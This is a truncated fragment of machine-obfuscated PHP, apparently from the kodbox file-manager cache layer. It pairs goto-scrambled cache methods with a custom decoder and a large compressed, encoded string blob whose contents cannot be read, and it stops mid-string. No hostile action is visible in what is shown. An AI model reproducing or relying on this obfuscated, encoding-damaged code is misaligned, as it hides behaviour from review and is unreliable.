$GLOBALS[$a·ƒÏŸù©©[6]][$a·ƒÏŸù©©[333]]; $E¬µáñµó  = $d–¢Ğ³‘®›[$d–¢Ğ³‘®›[$a·ƒÏŸù©©[741]]]; $E³Ç¡‚´É = $d–¢Ğ³‘®›[$a·ƒÏŸù©©[742]]; goto aŒÚ‘Ò“˜; aŒÚ‘Ò“˜: switch ($d–¢Ğ³‘®›[$a·ƒÏŸù©©[741]]) { case $a·ƒÏŸù©©[17]: self::$handle = Model($a·ƒÏŸù©©[743]); break; case $a·ƒÏŸù©©[744]: self::$handle = new CacheRedis($E¬µáñµó , $E³Ç¡‚´É); break; case $a·ƒÏŸù©©[745]: self::$handle = new CacheMemcached($E¬µáñµó , $E³Ç¡‚´É); break; case $a·ƒÏŸù©©[163]: self::$handle = new CacheFile($E¬µáñµó , $E³Ç¡‚´É); break; default: break; } return self::$handle; goto bŞ²­Šî¢ğ; fùÅÉÜŸ±©: $a·ƒÏŸù©© =& $_SERVER[»„]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto AÃíôö÷Â ; bŞ²­Šî¢ğ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($E†Ïª§ˆë‚) { if (is_array($E†Ïª§ˆë‚) || is_object($E†Ïª§ˆë‚)) { $E†Ïª§ˆë‚ = json_encode($E†Ïª§ˆë‚); } $E†Ïª§ˆë‚ = rawurlencode($E†Ïª§ˆë‚); return KOD_SITE_ID . $_SERVER[»„][70] . $E†Ïª§ˆë‚; } public static function get($AÚÔÙ‰‚­ñ) { $D‹”ÄĞà = self::key($AÚÔÙ‰‚­ñ); if (!isset(self::$memoryCache[$D‹”ÄĞà])) { $D³ìäÅÇç = self::init()->get($D‹”ÄĞà); self::$memoryCache[$D‹”ÄĞà] = unserialize($D³ìäÅÇç); } return self::$memoryCache[$D‹”ÄĞà]; } public static function set($aÉÔÔ¯ÈÛ™, $bà²»´ÀÆÑ, $d›ñÆ…¿È² = false) { goto B¼ªÕ¿ô…²; B¼ªÕ¿ô…²: $AÚ†¹ÇêİÁ = self::key($aÉÔÔ¯ÈÛ™); if (isset(self::$memoryCache[$AÚ†¹ÇêİÁ]) && self::$memoryCache[$AÚ†¹ÇêİÁ] === $bà²»´ÀÆÑ) { return !0; } if ($d›ñÆ…¿È² === 0) { self::$memoryCache[$AÚ†¹ÇêİÁ] = $bà²»´ÀÆÑ; return !0; } goto d¬‡âàÉ´¶; CÑ¾İÀáÍ: CacheLock::unlock($aÉÔÔ¯ÈÛ™); return $bÓùéËÆÌ³; goto døóŠ®§§Ğ; d¬‡âàÉ´¶: CacheLock::lock($aÉÔÔ¯ÈÛ™); $bÓùéËÆÌ³ = self::init()->set($AÚ†¹ÇêİÁ, serialize($bà²»´ÀÆÑ), $d›ñÆ…¿È²); self::$memoryCache[$AÚ†¹ÇêİÁ] = $bà²»´ÀÆÑ; goto CÑ¾İÀáÍ; døóŠ®§§Ğ: } public static function remove($bìå‰¯²•˜) { goto a‹—ëê¶; A¤ğàôÁ®æ: return $f·ãø«Êï×; goto aË£İ‰ ½‹; aïó‰‹°Š«: CacheLock::lock($bìå‰¯²•˜); $f·ãø«Êï× = self::init()->remove($e½¢´ğËì”); CacheLock::unlock($bìå‰¯²•˜); goto A¤ğàôÁ®æ; a‹—ëê¶: $e½¢´ğËì” = self::key($bìå‰¯²•˜); unset(self::$memoryCache[$e½¢´ğËì”]); self::clearTimeout(); goto aïó‰‹°Š«; aË£İ‰ ½‹: } public static function clearMemory($B²Ùâ®¦ = false) { if ($B²Ùâ®¦) { $B²Ùâ®¦ = self::key($B²Ùâ®¦); unset(self::$memoryCache[$B²Ùâ®¦]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[»„][746])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[»„][747])) { self::init()->clearTimeout(); } } } $Cô”ĞĞá = LIB_DIR . $_SERVER[»„][748]; $Aö¢ÅáÜêš = $_SERVER[»„][749]; goto F†¥È’§õ; c¬Úƒƒ‡‘Ü: if (!function_exists('_kodDe')) { function _kodDe($a‰Ï’éÒºœ) { $a‰Ï’éÒºœ = base64_decode($a‰Ï’éÒºœ); $B„£¡”ø = strlen($a‰Ï’éÒºœ); $F„ê±âƒßî = ''; $B›“ïãï• = ord($a‰Ï’éÒºœ[0]) - 30; for ($bñšî«¹ˆ = 1; $bñšî«¹ˆ < $B„£¡”ø; $bñšî«¹ˆ += 2) { if ($bñšî«¹ˆ + 1 < $B„£¡”ø) { $F„ê±âƒßî .= chr(ord($a‰Ï’éÒºœ[$bñšî«¹ˆ + 1]) + $B›“ïãï•); $F„ê±âƒßî .= chr(ord($a‰Ï’éÒºœ[$bñšî«¹ˆ]) + $B›“ïãï•); } else { $F„ê±âƒßî .= chr(ord($a‰Ï’éÒºœ[$bñšî«¹ˆ]) + $B›“ïãï•); } } return $F„ê±âƒßî; } } define(base64_decode('u4Q='), strrev('Ğ®Ä–')); $_SERVER[»„] = explode(strrev('|||'), gzinflate(substr(base64_decode('H4sIAAAAAAAAA519B2Bbxfk4oxSSlr1KKeVhEjyi4ZXl2E5kSbZFbEtIcpzEcpQn6Ul6tqQnv/c=')."\44\217\70\120\40\154\102\331\173\264\354\262\241\205\62\73\130\245\115\201\122\12\5\312\110\41\203\62\112\241\277\102\151\31\377\333\167\357\111\246\355\237\326\321\335\167\337\335\273\361\335\167\337\335\175\337"."\x77\x9b\x9f\xff\xcd\x6f\x67\x76\x9f\xd9\x6d\x66\xb7\xeb\xb7\x7e\x84\x3\x33\xbb\x82\xbf\xaf\xe3\xf0\x91\x67\xed\xb5\xb\xfa\x6f\xf7\xfc\x71\xbf\x1c\xd8\xad\x69\xbf\xcd\xdf\x6d\xff\xe7\xc1\x57\xb6\x1f\xd6\xfb\xf0\x81\xbb\x9f"."\164\117\367\232\67\17\70\164\163\40\362\312\211\371\272\374\363\345\243\233\146\36\136\320\262\345\216\115\53\167\76\142\276\376\333\53\16\273\357\347\57\305\377\172\347\272\333\277\266\71\264\372\307\341\261\307"."\xcf\xef\xf9\xd9\xb6\x5d\xcf\xfd\x47\xa3\xd9\xb4\x64\xe4\x8e\x8b\x3c\xed\x63\xf2\x5f\x63\x7f\x3c\x78\x9f\x5f\xdf\xf7\xa3\xd\xdf\x2b\xcd\xf9\xe1\xd4\x5e\xfd\x6b\x5f\x68\x99\xbe\x75\xe1\x3f\x5f\xff\x72\x55\xed\xd4\xd\x37\x25"."\112\77\166\37\373\360\223\273\274\76\374\375\375\336\70\374\233\33\317\337\363\157\43\312\274\367\336\276\344\33\273\36\365\333\367\277\376\315\33\66\355\366\223\364\135\273\237\370\160\344\223\133\175\47\164\236"."\176\150\323\371\67\334\174\337\372\55\275\55\135\216\333\174\237\265\136\175\115\366\203\167\345\371\255\357\372\57\354\377\375\225\35\231\277\134\330\377\374\322\303\335\7\374\336\45\53\35\51\377\141\67\174\176"."\xe3\x65\xa7\x9d\xec\x98\x5a\xff\xe3\x5f\xce\x9c\xf4\xd9\xfc\xc3\xee\x39\xee\xa3\x53\xb7\xdd\xdd\xf0\xa3\x65\x6f\xa5\xf7\x5d\xfa\x49\xf7\x61\xf\x66\xe\x79\xe4\x80\x6d\xa5\xd1\xeb\xe\x48\xa5\xbe\xf6\xcc\xc9\x5b\xf7\x7f\xea"."\337\316\257\77\71\164\354\143\37\336\326\261\256\373\126\347\45\117\173\72\17\175\346\214\207\76\371\305\337\277\177\374\360\5\77\72\162\311\142\317\226\325\337\133\375\376\232\357\235\365\233\157\257\52\36\175"."\353\337\257\171\376\73\335\243\163\256\330\147\116\76\225\274\341\236\137\315\71\121\63\342\57\357\161\315\365\77\367\136\174\221\366\306\156\273\354\202\73\272\15\377\110\5\315\224\224\111\325\60\15\14\110\152"._kodDe('KKp7t5CrV3V27tMOvZ/FeJznuVZ3FCoCD/J7XteKkpweq93/ClsLxFO4iYCBdmR/Rbu7UIEfRxZO')._kodDe('LIIOP4QTK5YNURbOSQHZ9+e2yV2VcDSDdIF6Bon8b0K5VCKsvEcL/OWKtUvCrK8v7vNzDBv+6C42')."\xde\x68\x20\x38\x80\xc1\xde\x60\x7f\x7f\x20\x5a\x9\xf\x7\xfb\xfa\xba\x3c\xde\x95\x95\x29\xa1\xb0\xa7\xa7\xdf\x23\x81\xfa\xe5\x94\xb8\x5a\x48\x6b\x75\xd2\x7a\x9c\xb2\x5e\xaa\xc7\x81\x6e\x55\xc9\xa5\x70\xb0\x20\xd3\xea\x98".strrev('òWRq¨8s.¦“üGBÔÔÉrŠS*WÓi—šºŠF\'ÌúG)rÒWõ"‘Ã—)Bƒ²ŠES')."\112\201\24\25\361\367\371\275\121\11\126\123\352\16\7\373\45\62\24\171\331\60\25\135\32\352\365\207\375\22\254\172\107\55\152\161\255\204\363\15\16\200\16\221\74\175\175\322\154\45\230\112\276\110\213\301".base64_decode('eaoUFgz7/GGpa43E+ymp5fNawQVKAeNpClX1h8M44CAU3BeAQ0ciwe7uiJ/FSOOO6wM1aSFUaok=')."\xa5\xd2\x39\x33\x5e\x96\x73\x25\x4a\xac\x63\xf8\xb7\x96\xfc\x90\x5f\xcd\x20\x4\x3c\xae\x16\xd4\x12\x21\x56\x52\x84\xa6\xb1\x99\x43\x2\x25\x8a\xad\x50\x48\x1e\x64\xd3\xc8\x9c\x2\x13\xac\x8c\x83\x1d\x9d\xf8\x77\x19\x41\x4a"."\xc4\x61\x9a\xa2\x9b\x71\xa5\x90\xd4\x52\x6a\x81\x4c\xc3\xe5\x64\xca\x11\xc2\x93\xcd\xac\x4f\x57\x1\x1e\x29\x50\x73\x25\xb5\xe2\x54\xbf\x56\x26\x6d\x48\xab\x39\xa5\x8f\xcd\xb2\xb4\x96\x4b\x29\x3a\x8f\x17\x41\x76\x31\x85\x34".base64_decode('Rp0Wcg+U8iIKiyazai6l08n5VZhNpFjFNEEzDFrTwWJOk1MRRRdq3w2KCZZMEVhCaN2anvcBBkA=')."\x7a\x7\x90\xbd\x3a\x58\x25\x61\x8c\x12\x7e\x4a\xe8\x14\x17\x61\x5c\x75\xc3\x27\x3a\xbf\x18\x19\x5e\x1\xfe\xa9\x27\x5c\x2c\x46\xaa\x96\x55\x72\xb9\xb8\x32\xa9\x90\x9\x92\x4f\x2d\x34\x68\xed\xdd\x46\x42\x2d\xb8\x1\x4\x47"."\x3\xc1\x78\x56\x36\xb2\xfd\xa9\x85\x71\x94\x8b\x32\xc7\x94\x32\xe9\x2a\x66\x8b\x64\xe\xb3\x69\x4b\x28\x17\x76\xf4\x80\x66\xfa\x5\xde\x9a\xd3\x92\x72\x4e\x6c\x22\xe\x67\x4d\xb3\x18\x51\xa\x29\xd8\x13\xa4\x29\xda\x44\x1"."\xf5\x54\x51\x51\x8\x92\xcf\x21\xa5\xa4\x7e\x69\x8d\xd4\xdb\xa6\xb6\x51\xb2\x2\x44\x92\x9e\xe2\xac\x2e\x6b\xe6\x73\x2c\x44\x9b\xc9\x60\x6\x3\x9a\x93\x84\x18\x6a\x48\x5c\x99\x34\x49\xef\x48\xcb\x92\x59\x59\x7\xe3\xd6\x51".base64_decode('MtPOJYRjFIs5NSmbqlZwa0lTMZ2GqSsyKa1mmQRJAU7dBpyLThuvVjDBvHVGdblgpBXd6Sd03SY=')."\201\16\146\254\213\242\371\124\243\250\31\52\374\114\233\44\233\246\234\314\302\151\317\213\357\370\12\174\265\220\123\13\112\5\256\47\231\124\14\303\11\263\350\132\316\351\311\345\264\11\147\120\127\63\52\310".strrev('ÀÔé†Kå!Ôa%&Ş¾MŒ0*ÌL†z)b¤Û—“9t†qJÔ£úz•WUE—åmI`&«`Ó')."\x77\x54\xb0\xc2\x91\xc1\xb\xa4\x9d\xfd\x70\x3c\x55\x25\xe5\x8c\x0\xf6\x4c\xc0\x2d\x8d\xad\x12\x20\x23\x89\xa6\x61\x68\x6f\x34\x1a\x8a\x7\xba\xc1\x2a\x3c\xe0\x8f\xf7\x7b\xa2\xde\x5e\x52\x6d\x53\xce\xd0\x3a\xf7\x1\xa6\xcb"."\212\244\300\325\116\60\327\40\241\15\200\76\342\300\220\66\241\350\340\303\135\123\155\322\230\226\112\150\223\56\232\4\221\43\200\75\120\144\330\243\105\323\31\226\13\31\330\77\211\51\123\41\344\150\224\63"."\x74\x35\x9\xaf\xf2\x87\xe3\x91\x60\x77\x74\xc8\x13\x26\x2b\x75\x1\x74\xf9\x24\x2d\x14\x16\x92\x73\x86\x95\x14\xe8\xe4\xa4\x49\x8b\x96\x8b\xb0\x7f\x28\xe\x9c\x12\x70\x34\x69\x2a\x9c\x26\x34\xad\x2f\xd0\x3\xbb\xc0\xe7\x34"."\0\222\123\304\242\145\367\251\171\25\326\322\144\51\250\317\300\62\336\103\52\344\106\125\357\210\145\33\352\142\251\5\365\116\360\157\103\375\160\314\347\152\30\131\356\126\171\36\167\223\253\111\152\156\134\44"."\205\200\134\241\312\71\211\320\113\5\106\243\24\134\151\245\250\76\245\220\61\263\104\324\12\373\217\33\364\107\242\361\176\177\264\67\350\43\271\375\36\22\352\323\360\4\243\265\35\306\77\43\144\34\300\112".base64_decode('n1GSWk7T5RxkI5RqFDqVM2qas+UAkEdIp2HGxSMRNV+kbMbMlvIJIejmJZARBcPBmIvGlhBNJ6E=').base64_decode('NjfJMr+5m/JKd6QF/J8zxpSWl6kgiaafksLzD4MaLCm9iszXJFM3NQjVLSj9ipnVyDTIKLRKJVY=')."\67\132\313\224\222\123\150\57\145\25\312\153\201\164\124\146\235\127\324\225\264\112\150\22\210\103\0\316\171\251\152\204\101\46\50\236\320\370\20\224\42\71\300\344\154\127\66\70\353\206\21\141\141\355\36\354"."\353\213\173\203\3\121\40\111\142\310\120\70\20\365\123\212\360\370\342\36\157\210\255\100\174\230\10\2\234\144\225\114\12\103\312\315\2\367\346\154\236\63\116\272\116\101\306\210\303\200\243\25\265\202\241\70"."\x93\xa4\xb4\x14\x67\xa1\x18\x63\x99\x8d\x7f\x56\xe4\xe0\xf2\xeb\xa4\x53\xce\x4f\x3b\xf3\x8a\x29\x3b\x59\xd5\xad\xab\x94\x14\x15\x17\xbb\x0\x19\x2\xce\xf2\x72\x60\x69\x4\xdb\x3\xba\x3c\x86\x82\x11\x92\x61\x39\x84\x2\x61"."\x22\xa1\xe8\xa4\x1e\xa1\x41\x92\x94\x17\x86\xbf\xc7\x4f\x80\x73\xe9\xa\x27\x13\xc1\xc3\x33\x14\xa1\xec\xaa\x4\xf0\x75\x75\x5a\xe6\x6d\x5c\x4e\xeb\x43\xca\x9e\xcc\xe7\xb8\x7c\x14\x57\x2d\xe3\x17\xd7\x12\xa3\x80\x43\x1\xa2"."\x93\xab\xb5\xda\xc9\xc7\x2a\xda\x1b\x18\x58\x19\xef\xf\xfa\xfc\x7d\xf1\xc0\x0\x60\x81\xd1\x4a\xf8\x60\xc8\xe7\xa1\x83\x2f\xc2\xbb\x82\xd1\x5e\xb\x74\x10\xf0\x89\x55\x9e\xbe\x80\x1d\xdd\xbf\x3a\x10\x89\x46\xaa\x26\x1\xd8"."\240\337\226\2\166\114\241\260\277\73\260\232\105\273\3\376\76\137\44\356\365\170\173\71\316\200\247\237\104\342\151\270\147\61\334\126\374\70\340\346\21\266\363\211\227\341\56\216\166\146\334\262\315\210\123\1"."\72\316\351\4\54\101\12\241\115\322\134\270\167\104\55\41\42\155\122\53\121\152\145\62\130\236\62\210\274\114\146\250\114\227\227\72\374\123\57\171\42\222\131\214\63\126\220\230\142\101\324\14\32\7\102\27"."\xf9\xbe\x44\x98\x6f\x45\xd\xe2\x10\xa7\x4b\x49\x6b\xba\xf2\x55\x0\x4f\xda\x64\x84\x61\x8b\x83\x79\xc3\xd3\xc0\x8\x78\xd0\x26\x15\x50\x2\x1a\x91\x38\x9d\x8b\x6\x10\xef\x3d\xb4\x3a\x69\xbe\x41\x8c\x7\xc1\x4e\xda\x3\xb7"."\227\361\241\160\160\240\207\144\230\310\52\264\2\1\322\375\165\124\44\41\273\114\223\263\44\40\117\310\134\64\244\235\76\252\321\256\234\301\77\307\340\37\40\202\221\217\53\5\332\353\11\310\230\31\343\240"."\133\10\60\133\50\123\325\112\354\153\11\115\313\321\171\14\326\132\306\57\330\376\164\324\240\104\62\111\231\323\2\272\152\221\305\41\32\134\351\37\210\123\312\302\61\201\32\61\0\354\370\202\141\322\41\246".strrev('¡¹gI$yÑ,¹‹QÀ¬7Ô×çaº‚ÄØº÷yòÖ±P€µÛ—v•%ã+ .Pì18÷F6')."\10\122\147\54\257\157\213\271\143\356\272\345\155\303\36\347\264\354\234\156\164\56\165\216\54\210\271\352\27\20\300\310\206\146\107\353\106\210\0\20\227\37\75\2\176\72\142\313\347\307\234\307\34\277\176\305"."\160\154\244\266\155\301\121\61\327\321\261\211\221\206\372\345\364\73\311\222\16\366\126\311\51\126\325\324\202\72\120\45\40\232\60\224\2\142\211\2\2\115\230\126\213\34\272\141\321\106\12\7\143\250\144\170"._kodDe('KVaDYVy9thZn9ZR0p30AdSNcNJMOrryrC1qB6HrFk5482YUK0YDDkXlxGcI1zQn3CS8AyNBaTwLU').base64_decode('8/HvRjqQGYUuy/A4SifUWSqo43SnXlDGSUAzKX0nFHNCoeQB4JY4IA66+QJJQiyHhDTyBb7pUdA=')."\xe\x80\xb4\xa2\x18\x87\x62\xd7\x4\x8b\xa5\x94\x2\x19\xa7\x39\x4\xdb\x48\xca\x45\x25\x22\xb4\x30\x1e\x8f\x7a\xba\xfa\xfc\x71\xca\x61\x8\x27\xa6\x71\xc4\x15\xbb\xd8\xd9\x16\x68\x1a\xe7\xa8\x6c\x27\xc9\xc5\x61\x63\x3c\x27".base64_decode('IWYgKbqu6W3o3M4oFaEsBvY+JuhPCeyEpY5OCXcz4RJxsdOLMpUm4B6VSQjuulisNKykRoYBIcs=')."\316\364\310\206\226\215\365\124\2\166\307\300\177\64\202\371\27\251\161\221\217\237\1\144\255\244\311\26\334\212\343\245\70\343\200\260\12\354\224\100\323\331\72\13\341\134\152\65\65\123\316\61\64\230\26\205"."\x10\xca\x6d\xe8\x5a\x4d\x76\xda\x78\x0\xfb\x38\x13\x82\xab\xb3\x70\xf8\x86\x38\xe4\x0\x3b\x59\x62\x7\x6\xc2\xb9\xf\x80\x39\x84\x28\xfe\xb7\xa3\x86\xb2\xe9\x2\x98\x8\x5e\xbe\x48\x5\x7c\x4e\x32\x88\x9e\xd5\xce\x0\x11"."\xe0\x59\x40\xa5\xa2\xa6\xc\xa6\xb3\x49\xa1\x86\x56\xd2\x93\xa\xc3\xb1\x8\x19\xa6\xac\x83\x35\x8b\x4b\x76\x50\x6\x13\x4e\x7\x41\xcd\x1d\xf0\x34\xc1\x1\xd7\x54\x7\x90\xf6\x1c\xf0\xb8\xc6\xc1\x25\x56\x7\x3f\x8\x70\x30"."\xf9\xd3\x41\xc4\x52\x7\x2f\x9d\x4\x3\x3e\x87\x6a\xf8\x90\x78\x8c\xca\x45\x49\xb4\xce\x66\x16\x6e\xab\x73\xf2\x94\x3\xd7\xbf\x4f\x29\x2b\x39\x7\xad\xbd\x83\x36\xca\x41\x5b\xe0\x40\xfb\xd\x1f\xa9\xcd\x20\xa0\xf\x52\x1b"."\24\4\114\42\353\200\303\1\307\226\226\2\203\264\33\230\120\355\340\2\267\43\243\153\245\142\210\176\111\210\341\312\20\0\257\51\3\204\65\315\164\320\15\20\13\364\63\16\4\253\303\103\253\370\200\363"."\332\263\345\223\64\1\307\355\165\300\120\230\336\55\227\305\1\256\72\330\5\53\141\360\103\116\176\30\307\305\45\373\106\304\176\310\303\73\221\127\42\52\147\42\302\347\115\71\103\277\135\45\25\207\303\112"."\x72\x2a\xc9\x37\x37\x3e\x61\xb7\x64\x8d\xb1\xa1\x47\x74\x58\x8d\x98\xaa\xf\x3d\x23\x10\x46\x6b\x73\xe7\xcc\xa1\x94\xcd\xe9\x88\x90\x8f\x85\xd8\x66\xa5\x6e\xde\xa6\x60\x91\xaf\x38\x90\x21\x44\x0\x1f\x14\xa6\x3c\x5\x5\x39"."\x87\x29\x91\x15\x52\x36\x92\x54\x96\x99\xa0\xd7\xc\xa\x85\x9\xf5\xa7\xad\xb7\x94\xb\xa3\x7c\x66\xd2\x26\x4a\xb0\x0\x87\xc0\xb3\xe1\xe8\x38\xf9\x10\xb\x51\xf2\xa3\x6a\x71\xdc\xaf\xf1\x3c\xdb\x59\xb0\x8e\xb6\x31\x23\xd8"."\xef\x21\xb5\x30\xa5\x16\xc4\xbd\x3b\x87\x72\x9e\xc7\x89\x2\x92\x37\x8f\xe1\x3e\x9e\x2d\x8c\x79\xb\x3f\x1b\x70\x90\x33\x3\x7\xd8\x37\x8e\x9\x5c\x8f\xef\x71\x41\xed\x61\x56\xa1\xee\xa4\x24\x5b\xcd\xe9\x4\x74\x5a\xa3\x7c".base64_decode('Pg6CbVLcRqqESLOyznuZzjFI2KxVBkThUQEtLZc5u7fkEWaGYU6xYw4haC0UR32zRXrZ7q9aVJw=')."\164\252\321\7\172\263\132\30\265\64\252\125\215\42\251\100\2\362\0\75\2\243\342\175\334\166\314\0\242\302\110\305\55\47\22\270\32\36\306\372\200\140\223\3\43\240\273\340\44\351\201\214\115\134\205\370"."\12\5\231\51\16\13\110\105\73\17\264\360\352\152\13\237\235\133\333\240\266\50\377\250\205\357\124\254\116\104\70\41\262\150\43\241\372\24\330\65\272\164\314\331\134\100\374\40\127\65\216\106\141\171\343\323".base64_decode('d4MxZZhKnnDCjbbeMcH2JiHrLh3UiFeULwlE+CgxwIgdAxffp1FZGNK/P6WaEAK5mUYPrTiiwOY=')."\31\114\50\20\165\211\253\142\14\162\352\30\311\345\230\157\301\254\306\311\135\15\210\347\272\370\332\43\256\134\342\245\20\104\343\55\207\227\114\70\44\134\247\346\331\255\23\2\272\14\123\53\362\24\41\212"."\223\205\44\136\250\200\305\72\37\325\20\254\0\51\44\37\360\56\104\270\44\57\222\240\61\161\273\162\0\303\45\262\42\217\256\123\42\301\315\203\47\70\0\50\202\340\164\215\320\23\304\152\34\31\27\356"."\57\363\153\122\134\24\374\260\13\57\120\56\71\225\12\322\343\65\61\134\211\52\236\46\124\57\10\335\134\263\242\204\130\165\164\117\56\307\257\301\354\361\131\263\340\271\52\146\22\41\263\146\353\106\102\60"."\275\177\250\6\143\62\135\267\215\206\370\214\343\327\214\166\221\327\312\174\376\223\70\126\61\3\370\200\126\217\103\376\230\125\13\212\301\126\46\335\250\306\147\376\223\174\143\221\172\255\202\214\50\301\220\345"."\220\67\127\354\126\110\376\263\321\2\114\23\16\225\300\36\12\0\304\165\204\235\234\160\276\43\54\225\150\331\211\233\226\145\77\214\312\20\346\203\145\210\301\374\303\55\352\326\265\174\40\10\346\127\165\242"."\xb3\xe3\x29\xf4\xec\x8\x31\xb5\x49\xb6\x25\x13\x33\x1\x22\x81\xab\xd0\x6c\x65\xd2\x64\x56\x14\x5f\xb2\x5e\xb9\xf1\xf9\x5b\x2f\x78\xf1\x7b\x67\xff\xfb\xa\x1c\x7f\xe9\x8c\x87\xae\x7e\xe0\xdc\xfb\xce\xdf\x82\xa3\x2d\xb\x97".base64_decode('4gD63644zDWHTlm9UfvTk4f96uPA729cGL5zVd1xd77b7Ls4NXxO7uXz33v49qPO2Xbc9f6P6j4=').base64_decode('ygbWfVF/371/OfKIttt2f1F+7JDcL76ey8/NZe8+5N+LjPeOP+uIqWePCOz51/Olhzf89f2pTzs=')."\236\375\174\140\362\260\373\37\177\74\370\363\147\277\70\376\316\307\227\267\232\355\257\327\144\152\377\376\355\321\77\64\154\137\273\171\345\215\256\347\316\133\366\350\337\277\325\363\223\353\223\147\155\272\153\162"."\373\1\77\217\215\325\217\276\326\372\300\274\153\217\232\357\132\263\365\334\117\216\333\357\354\304\65\77\335\175\361\325\155\247\334\367\235\67\277\74\162\333\61\127\356\367\134\363\271\357\216\216\157\362\76\175".base64_decode('5saTt5T3uizwxE2R8bWeB+7zHPHmxEuj3/IdcvCBex/w74Naz66fc8p3p0pPfNpznef0jq67f/I=')."\273\47\32\17\172\242\355\335\107\177\337\350\133\340\324\217\330\175\347\36\337\335\347\246\45\177\72\375\361\360\236\277\332\162\212\374\207\145\355\357\154\256\175\345\271\233\237\335\343\247\107\274\361\370\226\360"."\xfa\x3d\x7f\xba\xfd\x81\x8f\x1c\x2f\xee\xb5\xfb\x1\x27\x2e\xf0\xb6\xbf\xd0\xee\xdb\x7b\xf8\x82\xfb\x5e\x3f\xfe\xb6\xdc\x4f\x7e\xf7\xe4\x9a\xd\x6f\x3d\x17\x2c\x8c\x7d\x70\xc7\x63\xdf\xfd\xdb\x65\x7b\x3e\xf3\x9b\xd0\x5d\xd7"."\xfe\x31\x7a\xc4\x6e\xea\xe1\xf2\x37\xe\x4f\xbf\x96\x5b\x1b\x4b\x24\xb6\x7c\xe8\x79\xe0\x11\xf9\x92\xc5\x4f\x1e\x58\xcc\xd7\x8e\xfd\xdf\x69\xff\x7e\xf8\x91\x8e\x6f\x15\xee\xdb\x73\xed\xba\xe8\xdf\x9c\xeb\xde\x69\x5a\x76\xdd"."\13\215\343\107\314\173\352\252\301\337\234\272\346\305\27\32\56\331\224\311\26\136\274\164\335\55\373\30\267\135\366\343\154\353\345\57\205\366\370\316\120\331\167\353\203\205\13\337\355\372\143\144\343\41\207\337"."\176\313\272\301\167\372\357\152\64\217\330\143\170\364\201\73\276\167\312\234\357\35\173\323\76\353\56\354\75\167\153\115\303\372\355\363\316\274\373\332\267\247\217\70\354\366\127\147\56\151\154\77\47\371\330\57".base64_decode('9l+y4ZAlP7zhvrNvWeOfmnfJPzNbfeaWceXsx15+tdERW7V21SkrH9zTtfbP53of2bT3Fe89+uI=')."\x33\xbf\x6f\xde\x7c\xcb\xda\x85\x77\xad\xfd\xfa\xcf\x5b\x26\x57\xac\xf8\xd5\xad\xa7\x27\xb4\x4b\x6f\xd9\x67\xcd\x19\xbb\xfe\xe2\xb8\xb6\x9f\x7c\xbf\xfd\xca\xf\x26\xc6\xbf\xf6\xc0\x9b\xc9\x5c\x39\x97\xfb\x6d\xdb\x1\xf9\xee".base64_decode('g9buedTJP9l1w9fqzjxkXmvP3d+ItL/3q/12PW3XO/e9yfWtx3drfWL3mpbB0186o+XYk2564PI=')."\347\26\317\175\355\234\277\325\174\360\327\320\276\267\45\367\112\237\263\173\150\362\251\361\332\133\127\244\316\373\313\322\57\36\177\362\321\7\353\127\376\160\275\157\257\247\277\171\343\121\117\76\266\142\133\352"."\173\67\77\362\326\245\67\276\375\357\311\361\307\23\17\370\143\21\337\36\276\367\245\247\326\137\336\162\372\262\342\246\315\27\375\171\307\42\327\351\313\134\335\177\176\176\301\27\317\376\144\107\363\175\265\17"."\274\362\306\5\307\157\316\35\364\346\211\157\75\373\335\245\77\70\315\63\263\345\262\107\353\156\374\303\207\67\45\367\272\361\224\304\117\367\323\136\377\272\343\320\213\127\354\273\307\300\350\363\233\176\173\327".strrev('\'£àÿÚ.{şÚò^‰Şÿé?èO=‚ûp}?—F#“ãßŸöXºÿ}.+/úÿ¯sßzğ§y®VÛƒ	')."\x74\x6f\xed\xf4\xa8\x7f\xdd\x9e\xdb\x3a\xd8\x71\xc9\x75\xea\x55\xf\xa7\x9b\xff\x74\xe3\xbe\x37\x6c\x69\xf9\xe1\x4c\xee\xbe\x5f\x7d\x7e\x4e\xf9\x77\x57\xbf\xb7\xed\xb5\xa9\x5d\xe6\xfc\x42\xb9\x69\xc9\xd9\x2f\xd5\x77\x7c\x79"."\341\47\245\203\376\74\75\370\330\317\216\212\234\176\304\323\351\177\154\74\353\240\213\123\373\145\17\335\266\254\356\236\370\376\363\244\115\137\133\361\263\37\335\175\313\63\217\326\36\361\350\341\367\305\336\136"."\372\257\107\303\143\17\256\173\154\357\363\16\277\361\361\306\334\255\333\335\57\373\172\312\107\364\177\147\337\103\277\366\155\345\200\315\47\355\30\270\360\372\3\353\136\173\355\335\17\306\336\377\345\372\311\370".base64_decode('u/s+8N7xWuTwvU+74Mpnn297p+aHuZrDl1y9+xV9+3940A2F1hemF17xi7O3X/Xbd151Xvn6Bz8=')."\353\373\313\352\147\2\321\253\116\167\34\373\324\36\27\275\270\327\5\337\170\361\157\237\46\13\165\271\362\111\231\133\256\175\161\355\352\323\336\375\363\274\304\226\217\236\113\255\170\356\327\341\354\366\251\307"."\335\207\315\133\335\124\220\237\17\353\67\374\173\377\201\304\125\203\57\34\377\100\375\43\175\167\256\311\376\346\345\73\277\171\167\364\246\247\356\57\310\347\356\167\363\323\57\54\274\156\321\207\305\160\361\316"."\xc3\x3e\x6e\xf4\x7f\xf2\xb7\x6\x8f\xf1\x7f\x47\x44\xee\xf9\xd7\xa7\xbf\xb9\xeb\xcb\xd7\xbc\xaf\xbd\xfb\xf4\xb1\x6f\x3e\x79\xee\x55\x27\xcf\x5d\xe2\xbe\xe6\xc6\xa3\x2e\x76\x2d\x1b\xcf\x45\xfc\x87\xdc\x72\x51\xbf\x3f\x57\xdf".base64_decode('8ttjvuE8I7qouPtpR82Jn/x+suegM6SnbpOv2nX5gaGwa3DbU02nffODNw4v3/vW61nHX4493fk=').base64_decode('nblb3+87Zs9Xbv7pC4f/o/sHJ26eicee+vzzDzdtP+PFl9UPPvjk67t0Xva5S/5Jad+nm2ceOfU=')."\266\207\26\277\160\346\237\317\377\326\37\326\235\360\321\216\216\3\113\117\37\270\341\342\175\126\335\352\72\367\225\372\313\206\17\271\247\350\325\166\73\142\327\305\372\252\373\57\276\322\70\55\176\371\311\333"."\x7e\x70\x6f\xb6\x7c\xda\xb3\xc3\x2d\xfb\xfb\x27\xf4\xb6\xef\xec\x77\xdc\xed\xfd\x17\x1d\x71\xf